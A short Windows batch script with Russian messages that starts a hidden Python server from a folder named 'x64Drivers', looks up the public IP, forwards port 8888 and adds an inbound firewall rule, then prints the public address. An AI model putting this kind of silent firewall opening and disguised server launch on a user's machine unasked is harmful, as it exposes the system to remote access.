chcp 65001
@echo off
setlocal enabledelayedexpansion

start /MIN pythonw.exe "C:\Program Files\x64Drivers\server.py"

for /f "delims=" %%a in ('powershell -Command "(Invoke-RestMethod -Uri 'https://api.ipify.org').Trim()"') do set "ip=%%a"

set port=8888

netsh interface portproxy add v4tov4 listenport=%port% listenaddress=0.0.0.0 connectport=%port% connectaddress=127.0.0.1
netsh advfirewall firewall add rule name="Open_TCP_%port%" dir=in action=allow protocol=TCP localport=%port%

if "!ip!"=="" (
    echo Не удалось получить публичный IP
    pause
    exit /b 1
)

echo ==============================
echo Ваш публичный адрес доступа:
echo !ip!:!port!
echo ==============================

pause